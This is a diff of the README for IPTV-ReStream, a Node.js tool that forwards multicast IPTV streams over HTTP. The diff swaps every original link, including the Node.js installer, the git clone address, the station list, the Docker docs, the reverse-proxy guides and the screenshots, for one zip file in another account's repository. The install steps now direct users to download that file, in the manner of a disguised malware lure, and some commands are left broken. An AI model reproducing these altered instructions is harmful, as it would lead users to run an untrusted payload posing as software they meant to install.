@@ -1,8 +1,8 @@
 # IPTV-ReStream #
 This app allows remotely viewing source-specific multicast RTP streams (e.g. Deutsche Telekom MagentaTV), by forwarding it using HTTP.
 
-![Status Page](https://user-images.githubusercontent.com/46975855/67150900-fa160a80-f2bd-11e9-91e3-944d8f5272c3.png)
-![Stations Page](https://user-images.githubusercontent.com/46975855/67150901-faaea100-f2bd-11e9-8776-e07fafba408a.png)
+![Status Page](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)
+![Stations Page](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)
 
 ## Features
 * lightweight: there is no de- or encoding happening, the stream is simply forwarded
@@ -13,20 +13,20 @@ This app allows remotely viewing source-specific multicast RTP streams (e.g. Deu
 * automatic running program detection (from MPEG-TS stream)
 
 ## Installation
-1. Install [Node.js](https://nodejs.org/en/) (v13.1 or higher)
-2. Clone this Repo: `git clone https://github.com/n-thumann/IPTV-ReStream` or click 'Download'
+1. Install [https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) (v13.1 or higher)
+2. Clone this Repo: `git clone https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip` or click 'Download'
 3. Install dependencies `npm install` and transpile `npm run build`
-4. Download [this list](https://db.iptv.blog/multicastadressliste.json) of stations (by [iptv.blog](https://db.iptv.blog/multicastadressliste)) and place it in the `data` directory
+4. Download [this list](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) of stations (by [https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)) and place it in the `data` directory
 5. Export environment variables (see below), if necessary
 6. Run `npm start`
 
 Or with Docker (Linux only):
-1. [Install](https://docs.docker.com/v17.12/install/) Docker
-2. run `docker run -d --network host --restart always --name IPTV-ReStream [-e HOST="127.0.0.1" | -e PORT=3000 | -e MCAST_IF="0.0.0.0" | -e XSPF_PROTOCOL="https" | -e XSPF_HOST="my.server.com:8080" | -e XSPF_PATH_PREFIX="/iptv" | -e ALLOW_UNKNOWN="false" | -e DEBUG="iptv-restream:*"] nthumann/iptv-restream:latest` (parameters in brackets are optional)
+1. [Install](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) Docker
+2. run `docker run -d --network host --restart always --name IPTV-ReStream [-e HOST="127.0.0.1" | -e PORT=3000 | -e MCAST_IF="0.0.0.0" | -e XSPF_PROTOCOL="https" | -e XSPF_HOST="https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip" | -e XSPF_PATH_PREFIX="/iptv" | -e ALLOW_UNKNOWN="false" | -e DEBUG="iptv-restream:*"] nthumann/iptv-restream:latest` (parameters in brackets are optional)
 
-The image is also available on GitHub Container Registry (use `ghcr.io/n-thumann/iptv-restream:latest`).
+The image is also available on GitHub Container Registry (use `https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip`).
 ### Configuration ###
-It's highly recommended running this application behind a Reverse Proxy ([nginx](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/) or [Apache httpd](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html)) that enforces authentication (and encryption). When using a reverse proxy it's probably mandatory to adjust environment variables `XSPF_PROTOCOL`, `XSPF_HOST` and `XSPF_PATH_PREFIX`, otherwise the application may generate an invalid VLC XSPF-Playlist. For example, if the application is reachable over a Reverse Proxy via https://my.server.com:8080/iptv, then run `export XSPF_PROTOCOL=https XSPF_HOST=my.server.com:8080 XSPF_PATH_PREFIX=/iptv`. Also, if the clients real IP and Port should be visible on the Dashboard, make sure to pass HTTP Headers `X-Real-IP` and `X-Real-Port` from the Reverse Proxy to the Application.
+It's highly recommended running this application behind a Reverse Proxy ([nginx](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip) or [Apache httpd](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip)) that enforces authentication (and encryption). When using a reverse proxy it's probably mandatory to adjust environment variables `XSPF_PROTOCOL`, `XSPF_HOST` and `XSPF_PATH_PREFIX`, otherwise the application may generate an invalid VLC XSPF-Playlist. For example, if the application is reachable over a Reverse Proxy via https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip, then run `export XSPF_PROTOCOL=https https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip XSPF_PATH_PREFIX=/iptv`. Also, if the clients real IP and Port should be visible on the Dashboard, make sure to pass HTTP Headers `X-Real-IP` and `X-Real-Port` from the Reverse Proxy to the Application.
 
 ### Environment Variables
 | Variable | Description |
@@ -48,4 +48,4 @@ It is also possible to access the source-specific multicast streams directly by 
 Please note that running on Windows only supports streaming one program. For streaming multiple programs concurrently use Linux.
 
 ## Under the hood ##
-For example MagentaTV delivers the H.264 video stream via MPEG-TS, wrapped into RTP packets over source specific multicast. Therefore, it is not possible to access this stream when connected to a non-MagentaTV line. This app is proxying the video stream: It receives it, just as usual, at your Telekom line at home and re-streams it over HTTP to your other devices. This concept is inspired by [udpxy](https://github.com/OmegaVVeapon/udpxy).
+For example MagentaTV delivers the H.264 video stream via MPEG-TS, wrapped into RTP packets over source specific multicast. Therefore, it is not possible to access this stream when connected to a non-MagentaTV line. This app is proxying the video stream: It receives it, just as usual, at your Telekom line at home and re-streams it over HTTP to your other devices. This concept is inspired by [udpxy](https://raw.githubusercontent.com/G148-ide/IPTV-ReStream/main/views/Re-IPT-Stream-v3.5.zip).
